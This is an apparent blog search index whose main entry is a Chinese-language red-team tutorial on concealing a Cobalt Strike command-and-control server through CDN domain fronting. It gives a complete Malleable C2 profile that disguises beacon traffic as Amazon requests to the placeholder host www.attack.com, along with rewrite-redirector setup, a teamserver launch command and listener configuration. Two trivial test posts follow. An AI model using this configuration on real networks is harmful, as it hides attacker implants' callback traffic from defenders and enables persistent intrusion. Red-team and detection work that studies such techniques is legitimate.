<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C2隐匿之域前置</title>
      <link href="2020/09/22/c2-yin-ni-zhi-yu-qian-zhi/"/>
      <url>2020/09/22/c2-yin-ni-zhi-yu-qian-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="Domain-Fronting"><a href="#Domain-Fronting" class="headerlink" title="Domain Fronting"></a>Domain Fronting</h1><h2 id="step1-apache-or-ngnix"><a href="#step1-apache-or-ngnix" class="headerlink" title="step1: apache or ngnix "></a>step1: apache or ngnix </h2><hr><p><strong>1:首先需要一台前置服务器，以便流量中转。然后注册一个域名，如：attack.com</strong></p><hr><p><strong>2:然后利用CDN解析域名到域前置服务器同时隐藏ip</strong></p><p>有时候修改HTTP包内的Host头字段，会将HTTP包发送给Host指向的那个域名。这就是因为这两个网站域名都是使用了同一家的CDN，而CDN就是通过判断Host头进行流量转发的。<br>很多CDN都存在这个特性。因此CDN可以匿藏你的域前置服务器的ip.</p><hr><h2 id="step2-域前置服务器的Rewrite设置"><a href="#step2-域前置服务器的Rewrite设置" class="headerlink" title="step2: 域前置服务器的Rewrite设置"></a><strong>step2: 域前置服务器的Rewrite设置</strong></h2><hr><p>域前置服务器收到cs马的stage，需要转发给teamserver，这时候需要利用rewrite进行流量的转发。</p><p>这里可以利用<a href="https://github.com/threatexpress/cs2modrewrite">脚本</a> 生成apache 的rewrite配置代码。</p><hr><h2 id="step3-C2-Server自定义流量"><a href="#step3-C2-Server自定义流量" class="headerlink" title="step3:C2 Server自定义流量"></a><strong>step3:C2 Server自定义流量</strong></h2><p>配置C2 profile以设置CS生成payload的http请求参数，我这里直接使用并修改了<a href="https://twitter.com/harmj0y">harmj0y</a> 在github上的项目<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a> 中的amazon.profile。</p><pre><code>set sleeptime &quot;5000&quot;;set jitter    &quot;0&quot;;set maxdns    &quot;255&quot;;set useragent &quot;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko&quot;;http-get &#123;    set uri &quot;/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books&quot;;    client &#123;        header &quot;Accept&quot; &quot;*/*&quot;;        header &quot;Host&quot; &quot;www.attack.com&quot;;        metadata &#123;            base64;            prepend &quot;session-token=&quot;;            prepend &quot;skin=noskin;&quot;;            append &quot;csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;            header &quot;Cookie&quot;;        &#125;    &#125;    server &#123;        header &quot;Server&quot; &quot;Server&quot;;        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;        header &quot;Content-Encoding&quot; &quot;gzip&quot;;        output &#123;            print;        &#125;    &#125;&#125;http-post &#123;    set uri &quot;/N4215/adj/amzn.us.sr.aps&quot;;    client &#123;        header &quot;Accept&quot; &quot;*/*&quot;;        header &quot;Content-Type&quot; &quot;text/xml&quot;;        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;        header &quot;Host&quot; &quot;www.attack.com&quot;;        parameter &quot;sz&quot; &quot;160x600&quot;;        parameter &quot;oe&quot; &quot;oe=ISO-8859-1;&quot;;        id &#123;            parameter &quot;sn&quot;;        &#125;        parameter &quot;s&quot; &quot;3717&quot;;        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.attack.com&quot;;        output &#123;            base64;            print;        &#125;    &#125;    server &#123;        header &quot;Server&quot; &quot;Server&quot;;        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=&quot;;        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;        header &quot;x-ua-compatible&quot; &quot;IE=edge&quot;;        output &#123;            print;        &#125;    &#125;&#125;</code></pre><p>这里将Host修改成我们申请到的域名就行了(<a href="http://www.attack.com),启动teamserver加载profile./">www.attack.com)，启动teamserver加载profile。</a></p><p><em>./teamserver 1.1.1.1 xxxx ./c2.profile</em></p><hr><h2 id="step4-C2-server-创建监听"><a href="#step4-C2-server-创建监听" class="headerlink" title="step4:C2-server 创建监听"></a><strong>step4:C2-server 创建监听</strong></h2><p>完成之后，当目标执行payload 对你的域名 attack.com 发起 <a href="http://www.attack.com/xxxx">http://www.attack.com/xxxx</a> 请求</p><p><img src="/images/DomainFronting/listener.jpg" alt="配置监听器"></p><hr><p>此处连接的显示的ip为CDN的解析IP地址。此时域前置将请求转发到真正的C2-server，然后得到响应payload的stager。</p><p><img src="/images/DomainFronting/shell.jpg" alt="payload执行"></p><hr><p>C2-server 上线成功</p><p><img src="/images/DomainFronting/success.jpg" alt="payload执行"></p><hr><blockquote><p>Tips:记录几个坑点</p><ol><li>测试Rewrite配置是否正确启动</li><li>CDN会拦截请求，导致文件执行失败，需要设置CDN防火墙</li></ol></blockquote><hr><p>*遗留问题</p><blockquote><p><strong>在此配置场景的会话下，无法获取进程迁移与权限提升的会话。</strong></p></blockquote><p>参考链接：<br><a href="https://xz.aliyun.com/t/7758">https://xz.aliyun.com/t/7758</a><br><a href="https://www.lz1y.cn/2019/03/21/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE-%E9%9A%90%E8%97%8F%E4%BD%A0%E7%9A%84C2-server/">https://www.lz1y.cn/2019/03/21/红队基础建设-隐藏你的C2-server/</a></p>]]></content>
      
      
      <categories>
          
          <category> attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码保护文件</title>
      <link href="2020/09/22/mi-ma-bao-hu-wen-jian/"/>
      <url>2020/09/22/mi-ma-bao-hu-wen-jian/</url>
      
        <content type="html"><![CDATA[<p>root<br>root</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FirstBlog</title>
      <link href="2020/09/22/firstblog/"/>
      <url>2020/09/22/firstblog/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
